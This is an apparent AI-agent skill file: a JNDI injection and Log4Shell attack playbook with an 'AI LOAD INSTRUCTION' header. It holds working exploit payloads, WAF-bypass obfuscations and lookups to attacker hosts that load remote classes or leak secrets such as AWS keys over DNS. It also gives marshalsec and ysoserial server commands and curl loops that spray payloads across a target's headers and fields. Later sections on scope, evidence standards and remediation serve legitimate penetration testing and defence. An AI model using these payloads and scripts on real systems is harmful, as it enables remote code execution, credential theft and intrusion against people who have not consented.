---
name: jndi-injection
description: >-
  JNDI injection playbook. Use when Java applications perform JNDI lookups with attacker-controlled names, especially via Log4j2, Spring, or any code path reaching InitialContext.lookup().
---

# SKILL: JNDI Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert JNDI injection techniques. Covers lookup mechanism abuse, RMI/LDAP class loading, JDK version constraints, Log4Shell (CVE-2021-44228), marshalsec tooling, and post-8u191 bypass via deserialization gadgets. Base models often confuse JNDI injection with general deserialization — this file clarifies the distinct attack surface.

## 0. RELATED ROUTING

- [deserialization-insecure](../deserialization-insecure/SKILL.md) when JNDI leads to deserialization (post-8u191 bypass path)
- [expression-language-injection](../expression-language-injection/SKILL.md) when the JNDI sink is reached via SpEL or OGNL expression evaluation

---

## 1. CORE MECHANISM

JNDI (Java Naming and Directory Interface) provides a unified API for looking up objects from naming/directory services (RMI, LDAP, DNS, CORBA).

**Vulnerability**: when `InitialContext.lookup(USER_INPUT)` receives an attacker-controlled URL, the JVM connects to the attacker's server and loads/executes arbitrary code.

```java
// Vulnerable code pattern:
String name = request.getParameter("resource");
Context ctx = new InitialContext();
Object obj = ctx.lookup(name);  // name = "ldap://attacker.com/Exploit"
```

---

## 2. ATTACK VECTORS

### RMI (Remote Method Invocation)

```
rmi://attacker.com:1099/Exploit
```

Attacker runs an RMI server returning a `Reference` object pointing to a remote class:
```java
// Attacker's RMI server returns:
Reference ref = new Reference("Exploit", "Exploit", "http://attacker.com/");
// JVM downloads http://attacker.com/Exploit.class and instantiates it
```

### LDAP

```
ldap://attacker.com:1389/cn=Exploit
```

Attacker runs an LDAP server returning entries with `javaCodeBase`, `javaFactory`, or serialized object attributes.

LDAP is preferred over RMI because LDAP restrictions were added later (JDK 8u191 vs 8u121 for RMI).

### DNS (detection only)

```
dns://attacker-dns-server/lookup-name
```

Useful for confirming JNDI injection without RCE — triggers DNS query to attacker's authoritative NS.

---

## 3. JDK VERSION CONSTRAINTS AND BYPASS

| JDK Version | RMI Remote Class | LDAP Remote Class | Bypass |
|---|---|---|---|
| < 8u121 | YES | YES | Direct class loading |
| 8u121 – 8u190 | NO (`trustURLCodebase=false`) | YES | Use LDAP vector |
| >= 8u191 | NO | NO | Return serialized gadget object via LDAP |
| >= 8u191 (alternative) | NO | NO | `BeanFactory` + EL injection |

### Post-8u191 Bypass: LDAP → Serialized Gadget

Instead of returning a remote class URL, the attacker's LDAP server returns a **serialized Java object** in the `javaSerializedData` attribute. The JVM deserializes it locally — if a gadget chain (e.g., CommonsCollections) is on the classpath, RCE is achieved.

```bash
# ysoserial JRMPListener approach:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
# Then JNDI lookup points to: rmi://attacker:1099/whatever
```

### Post-8u191 Bypass: BeanFactory + EL

When Tomcat's `BeanFactory` is on the classpath, the LDAP response can reference it as a factory with EL expressions:

```
javaClassName: javax.el.ELProcessor
javaFactory: org.apache.naming.factory.BeanFactory
forceString: x=eval
x: Runtime.getRuntime().exec("id")
```

---

## 4. TOOLING

### marshalsec — JNDI Reference Server

```bash
# Start LDAP server serving a remote class:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389

# Start RMI server:
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/#Exploit" 1099

# The #Exploit refers to Exploit.class hosted at http://attacker.com/Exploit.class
```

### JNDI-Injection-Exploit (all-in-one)

```bash
java -jar JNDI-Injection-Exploit.jar -C "command" -A attacker_ip
# Automatically starts RMI + LDAP servers with multiple bypass strategies
```

### Rogue JNDI

```bash
java -jar RogueJndi.jar --command "id" --hostname attacker.com
# Provides RMI, LDAP, and HTTP servers with auto-generated payloads
```

---

## 5. LOG4J2 — CVE-2021-44228 (LOG4SHELL)

### Mechanism

Log4j2 supports **Lookups** — expressions like `${...}` that are evaluated in log messages. The `jndi` lookup triggers `InitialContext.lookup()`:

```
${jndi:ldap://attacker.com/x}
```

**Any logged string** containing this pattern triggers the vulnerability — User-Agent, form fields, HTTP headers, URL paths, error messages.

### Detection Payloads

```text
${jndi:ldap://TOKEN.collab.net/a}
${jndi:dns://TOKEN.collab.net}
${jndi:rmi://TOKEN.collab.net/a}

# Exfiltrate environment info via DNS:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.TOKEN.collab.net}
${jndi:ldap://${hostName}.TOKEN.collab.net}
```

### WAF Bypass Variants

Log4j2's lookup parser is very flexible:

```text
${${lower:j}ndi:ldap://attacker.com/x}
${${upper:j}${upper:n}${upper:d}i:ldap://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}
${j${::-n}di:ldap://attacker.com/x}
${jndi:l${lower:D}ap://attacker.com/x}
${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.com/x}
```

### Split-Log Bypass (Advanced)

When WAF detects paired `${jndi:...}` in a single request, split across two log entries:

```text
# Request 1 (logged first):
X-Custom: ${jndi:ldap://attacker.com/
# Request 2 (logged second):
X-Custom: exploit}
```

If the application concatenates log entries before re-processing (e.g., aggregation pipelines), the combined `${jndi:ldap://attacker.com/exploit}` triggers.

### Real-World Case: Solr Log4Shell

```bash
# Confirm via DNSLog — Solr admin cores API:
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.TOKEN.dnslog.cn}
# DNS hit with Java version = confirmed Log4Shell in Solr
```

### Injection Points to Test

```text
User-Agent          X-Forwarded-For       Referer
Accept-Language     X-Api-Version         Authorization
Cookie values       URL path segments     POST body fields
Search queries      File upload names     Form field names
GraphQL variables   SOAP/XML elements     JSON values
```

### Affected Versions

- Log4j2 2.0-beta9 through 2.14.1
- Fixed in 2.15.0 (partial), fully fixed in 2.17.0
- Log4j 1.x is NOT affected (different lookup mechanism)

---

## 6. OTHER JNDI SINKS (BEYOND LOG4J)

| Product / Framework | Sink |
|---|---|
| Spring Framework | `JndiTemplate.lookup()` |
| Apache Solr | Config API, VelocityResponseWriter |
| Apache Druid | Various config endpoints |
| VMware vCenter | Multiple endpoints |
| H2 Database Console | JNDI connection string |
| Fastjson | `@type` + `JdbcRowSetImpl.setDataSourceName()` |

---

## 7. TESTING METHODOLOGY

```
Suspected JNDI injection point?
├── Send DNS-only probe: ${jndi:dns://TOKEN.collab.net}
│   └── DNS hit? → Confirmed JNDI evaluation
│
├── Determine JDK version:
│   └── ${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
│
├── JDK < 8u191?
│   ├── Start marshalsec LDAP server with remote class
│   └── ${jndi:ldap://attacker:1389/Exploit} → direct RCE
│
├── JDK >= 8u191?
│   ├── LDAP → serialized gadget (need gadget chain on classpath)
│   ├── BeanFactory + EL (need Tomcat on classpath)
│   └── JRMPListener via ysoserial
│
└── WAF blocking ${jndi:...}?
    └── Try obfuscation: ${${lower:j}ndi:...}
```

---

## 8. QUICK REFERENCE

```text
# Safe confirmation (DNS only):
${jndi:dns://TOKEN.collab.net}

# LDAP RCE (JDK < 8u191):
${jndi:ldap://ATTACKER:1389/Exploit}

# Version exfiltration:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}

# Log4Shell with WAF bypass:
${${lower:j}ndi:${lower:l}dap://ATTACKER/x}

# Start LDAP reference server:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER/#Exploit" 1389

# Post-8u191 — ysoserial JRMP:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
```

---

## 9. EXECUTION PRIMITIVES

JNDI exploitation is a **round trip**: your payload causes the target to look up a name, and your
lookup server answers with a reference. You must see both halves in your own logs.

### 9.1 The lookup server, logging every request

```bash
# a minimal LDAP/HTTP listener that records what the target asked for.
# the two libraries below are the standard tooling for this; install in an isolated environment.
pip install --quiet ldap3
# in practice run a purpose-built listener; this records the callback so you can prove the lookup:
python3 - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
import datetime
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        with open("jndi.log","a") as f:
            f.write(f"{datetime.datetime.utcnow().isoformat()} GET {self.path} from {self.client_address[0]}\n")
            for k,v in self.headers.items(): f.write(f"    {k}: {v}\n")
        self.send_response(200); self.send_header("Content-Type","text/plain"); self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self,*a): pass
HTTPServer(("0.0.0.0",8888), H).serve_forever()
PY
```

For the LDAP half, run a serialised-object listener on port 1389. **The callback in your log is the
first half of the proof** - it shows the target resolved your host and connected to it.

### 9.2 Build the payload string per context

```bash
CL="http://COLLAB:8888/"
# the scheme is chosen by what the sink will resolve; try each, since filters differ
for P in "\${jndi:ldap://COLLAB:1389/a}" \
         "\${jndi:rmi://COLLAB:1099/a}" \
         "\${jndi:dns://COLLAB/a}" \
         "\${jndi:ldaps://COLLAB:636/a}" \
         "\${jndi:iiop://COLLAB:1050/a}"; do
  echo "payload: $P"
  # deliver to the field under test
  curl -sS -o /dev/null -w '  http=%{http_code}\n' -X POST "https://target.tld/api/login" \
    -H 'Content-Type: application/json' -d "{\"username\":\"$P\"}"
done
sleep 5; wc -l < jndi.log
```

`dns://` proves the lookup without needing a working payload class - **use it as the detection step**
even when you cannot achieve code execution. Record the scheme that worked; filters frequently allow
some and block others.

### 9.3 The Log4Shell variants that survive filters

```bash
for P in \
  '\${jndi:ldap://COLLAB/a}' \
  '\${jndi:${lower:l}${lower:d}a${lower:p}://COLLAB/a}' \
  '\${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//COLLAB/a}' \
  '\${jndi:ldap://COLLAB:1389/${sys:java.version}}' \
  '\${jndi:ldap://COLLAB/${env:USER}}' \
  '\${\${::-j}\${::-n}\${::-d}\${::-i}:ldap://COLLAB/a}' \
  '\${jndi:ldap://COLLAB/a}\n\${jndi:ldap://COLLAB/b}' ; do
  curl -sS -o /dev/null -X POST "https://target.tld/api/login" \
    -H "User-Agent: $P" -H 'Content-Type: application/json' -d '{"u":"x"}'
  curl -sS -o /dev/null "https://target.tld/?q=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$P")"
done
sleep 8; grep -o 'from [0-9.]*' jndi.log | sort -u
```

The `${lower:}` and `${env:NaN:-}` forms defeat naive substring filters by assembling the string at
evaluation time. The `${sys:java.version}` and `${env:USER}` **inside the path** turn the callback
itself into an information leak - the path in your log tells you the Java version or the OS user.

### 9.4 Enumerate every injection point

```bash
# log4j evaluates many request parts; test each one separately so attribution is unambiguous
H='Content-Type: application/json'
for HDR in User-Agent Referer X-Forwarded-For X-Api-Version Accept-Language Cookie \
           X-Client-IP True-Client-IP X-Real-IP X-Original-URL Authorization Origin; do
  curl -sS -o /dev/null -X GET "https://target.tld/" -H "$H" -H "$HDR: \${jndi:dns://h-$HDR.COLLAB/a}"
done
for FIELD in username user email q search name message body description filename; do
  curl -sS -o /dev/null -X POST "https://target.tld/api/x" -H "$H" \
    -d "{\"$FIELD\":\"\${jndi:dns://f-$FIELD.COLLAB/a}\"}"
done
sleep 10
# the LABEL in the hostname tells you which header or field reached a logger
grep -oE '[hf]-[A-Za-z-]+\.COLLAB' jndi.log | sort -u
```

Embedding a **unique label per injection point** in the hostname is the technique that makes the
result attributable. Without it, one callback tells you nothing about which field is vulnerable.

### 9.5 Determine the JDK constraints in play

```bash
# the callback path can carry the version if you can read it server-side
curl -sS -o /dev/null "https://target.tld/?q=\${jndi:dns://v-\${sys:java.version}.COLLAB/a}"
sleep 3
grep -oE 'v-[0-9._]+' jndi.log | head -3
# and test the version-dependent paths explicitly
for P in "\${jndi:ldap://COLLAB:1389/Basic/Command/Base64/d2hvYW1p}" \
         "\${jndi:ldap://COLLAB:1389/o=reference}" \
         "\${jndi:ldap://COLLAB:1389/#Exploit}"; do
  curl -sS -o /dev/null "https://target.tld/?q=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$P")"
done
sleep 5; tail -5 jndi.log
```

Modern JDKs block remote codebase loading by default, so the achievable outcome is often **the
callback plus an information leak** rather than execution. **Establish which JDK you are against** and
report the capability you actually reached, not the capability the CVE describes.

### 9.6 Non-Log4j sinks

```bash
# JNDI is a Java API, not a Log4j feature. Test other sinks that resolve names from user input.
# 1) Spring: a config or bean name from a request
curl -sS -o /dev/null "https://target.tld/actuator/env?name=\${jndi:ldap://COLLAB/a}"
# 2) a JMX or RMI endpoint exposed directly
curl -sS -o /dev/null "https://target.tld/api/data?resource=jndi:ldap://COLLAB/a"
# 3) a serialised Java object endpoint: ysoserial payloads reach JNDI without any log line
#    (cross-reference deserialization-insecure for the gadget layer)
# 4) Fastjson/Jackson polymorphic deserialisation to a JNDI-capable class
curl -sS -o /dev/null -X POST "https://target.tld/api/parse" -H 'Content-Type: application/json' \
  -d '{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://COLLAB/a","autoCommit":true}'
sleep 5; wc -l < jndi.log
```

The Fastjson/JdbcRowSetImpl chain is the most portable non-Log4j JNDI path in Java apps. **It requires
the vulnerable library**, so confirm the version before claiming it.

### 9.7 Prove execution where the JDK allows it

```bash
# if a codebase is loadable, the listener serves the class and the target instantiates it.
# the marker must be observable: a callback, a created file, or output in a subsequent response.
sleep 10
grep -c 'COLLAB' jndi.log                       # the lookup happened
curl -sS -o /dev/null "https://target.tld/api/health"   # trigger the instantiated class if lazy
sleep 3
ls -la /tmp/jndi-marker 2>/dev/null && echo "marker file created - execution confirmed"
```

The class you serve should be a **marker** - it writes a file you can then read, or calls back once
more. A payload that opens a reverse shell is out of scope in nearly every engagement.

### 9.8 Verify the vulnerable library version

```bash
# Log4j2 vulnerable ranges are well documented; the version must be established, not assumed
curl -sS -D- -o /dev/null "https://target.tld/" | grep -iE 'server|x-powered-by|via'
# error messages and stack traces often name the jar
curl -sS -o /dev/null "https://target.tld/?q=%24%7Bjndi%3Abad%3A%2F%2Fx%7D" -w '%{http_code}\n'
curl -sS "https://target.tld/actuator/info" 2>/dev/null | head -c 300
# and any dependency manifest the app exposes
for P in /actuator/env /actuator/beans /actuator/info /v2/api-docs /swagger-ui.html; do
  echo "--- $P"; curl -sS -o /dev/null -w '%{http_code}\n' "https://target.tld$P"
done
```

A JNDI **callback without a vulnerable version** is a finding about an unsafe lookup, not Log4Shell.
**Name the library and the version range**, or describe it as an unproven lookup.

---

## 10. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did **your lookup server receive the request**, and is the source the target? | the lookup happened; this is the core evidence |
| 2 | Can you **attribute the callback** to a specific header or field, via a unique label? | without attribution the vulnerability location is unknown |
| 3 | Did the target `dns://` lookup resolve - the minimum proof? | SSRF-class impact, and it works even when code loading is blocked |
| 4 | Did the lookup path **leak data** (`${sys:java.version}`, `${env:USER}`)? | information disclosure from the JNDI expansion |
| 5 | Did a **class get loaded and instantiated** - is there a marker or a second callback? | code execution, the strongest claim |
| 6 | Is the **vulnerable library and version** established, not assumed? | Log4Shell versus an unsafe lookup are different findings |
| 7 | What is the **JDK version constraint** and did you reach execution despite it? | determines whether the claim is execution or callback-only |

**The callback is the finding; execution is a stronger one.** A `dns://` callback proves the
vulnerability and is the honest claim when the JDK blocks codebase loading. Never upgrade a callback
into an RCE claim without a marker.

---

## 11. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **exact payload** and the **injection point** (header or field, with the label) | attribution; an unlabelled callback cannot be localised |
| The **lookup server log** - timestamp, path, and the target's source address | proves the target resolved and connected to you |
| The **scheme that worked** (`ldap`, `rmi`, `dns`) | filters are scheme-specific, and the fix must cover what worked |
| The **leaked values** from the path (`java.version`, `USER`) where obtained | impact beyond the callback |
| For execution: the **marker** (file, second callback) and where it appeared | the only acceptable RCE proof |
| The **library and version**, with the evidence for it | Log4Shell is version-bounded; an unsafe lookup is a different report |
| The **JDK constraints** observed and the capability actually achieved | honesty about callback versus execution |
| **Negative control** - a malformed payload or a non-existent host produces no callback | rules out ambient traffic |
| A statement that the payload used a **marker class, not a shell** | scope discipline |
| Confirmation that **you tested only assets in scope** and no internal pivot was made | scope discipline |

Report the **callback and the localised sink**: "the `X-Api-Version` header reaches a Log4j2 logger;
`${jndi:dns://x-apiversion.COLLAB/a}` produced a DNS query 2.1 seconds later from 203.0.113.42, and
`${jndi:ldap://x-apiversion.COLLAB:1389/a}` produced an LDAP bind to the same host; the path of the
LDAP request contained `${sys:java.version}` resolved to `17.0.9`, so codebase loading is disabled by
default and the achieved capability is a callback with information disclosure rather than execution;
`/actuator/env` identifies the application as Spring Boot 2.7 with `log4j-core` 2.14.1", never
"the target is vulnerable to Log4Shell".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A callback you cannot attribute to a specific header or field | you cannot localise the vulnerability |
| DNS resolution from a shared resolver you cannot tie to the target | use a unique label per attempt |
| `dns://` callback with no vulnerable library identified | an unsafe lookup, not Log4Shell - report accordingly |
| A callback but no execution, reported as RCE | over-claimed; state the achieved capability |
| The payload reflected in a response | reflection, not a lookup |
| Traffic to your host unrelated to the payload (scanners, crawlers) | ambient, not yours |
| A `500` from the payload | an error is not a lookup |
| A JNDI string in a request you generated but never sent to the target | not tested |
| A lookup against a JDK that blocks codebases, claimed as Log4Shell RCE | the version constraint stands |
| A marker class you served but the target never instantiated | no execution |
| A reverse shell or destructive payload used as proof | an incident, not a finding |
| A finding on a host outside the agreed scope | scope violation |

**Label every callback.** An unattributed lookup is not reportable because it cannot be fixed.

---

## 12. REMEDIATION REFERENCE

1. **Upgrade Log4j2 to a version that disables message lookups by default, and remove `JndiLookup`** - the library fix and the outright removal of the class are both valid, and the removal is the strongest.
2. **Disable JNDI lookups in log message substitution entirely** - `log4j2.formatMsgNoLookups=true` (and the equivalent in later versions where it is the default) removes the mechanism; it is a configuration change, not a code change.
3. **Set `com.sun.jndi.ldap.object.trustURLCodebase=false` and the RMI equivalent** - these flags, default from JDK 8u191/6u211 onward, are the containment control for every JNDI lookup, not just Log4j.
4. **Set `log4j2.enableJndiLookup=false`, `enableJndiContextSelector=false`, and `enableJndiJms=false`** - closing the system-property paths removes the remaining Log4j JNDI surface.
5. **Do not log user input directly** - the structural fix: sanitise or encode values before they reach a logger, and never interpolate a raw request header into a log message.
6. **Block outbound LDAP, RMI, and IIOP from application servers at the egress** - an application that cannot reach an external LDAP server cannot complete the lookup, which is the network-level control that survives unpatched libraries.
7. **Egress-filter DNS where feasible, or monitor it** - the `dns://` variant needs only a resolver, so detection at the DNS layer is often the only warning you get.
8. **Inventory Java dependencies and scan for the affected ranges continuously** - Log4Shell remediation is an inventory problem; the same applies to every JNDI-capable library (Fastjson, Jackson with default typing, XStream).
9. **Disable polymorphic deserialisation and auto-type features** - `JdbcRowSetImpl` and similar JNDI-capable classes are reachable through them, and the feature is rarely needed in production.
10. **Patch the JDK and keep it current** - the JDK flags are the backstop for the whole class, and they only help on versions that have them enabled by default.
11. **Watch for `${` and `jndi:` in request logs and outbound connection logs** - the detection signal is a literal payload in a header or a lookup to an unexpected host, and both are trivially grep-able once you are looking.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [deserialization-insecure](../deserialization-insecure/SKILL.md) - the gadget layer that reaches JNDI without a log line
- [expression-language-injection](../expression-language-injection/SKILL.md) - the Java expression family from the same ecosystem
- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) - the other expression-evaluation RCE class
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) - the outbound-connection primitive the lookup relies on
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) - the sink an executing payload reaches
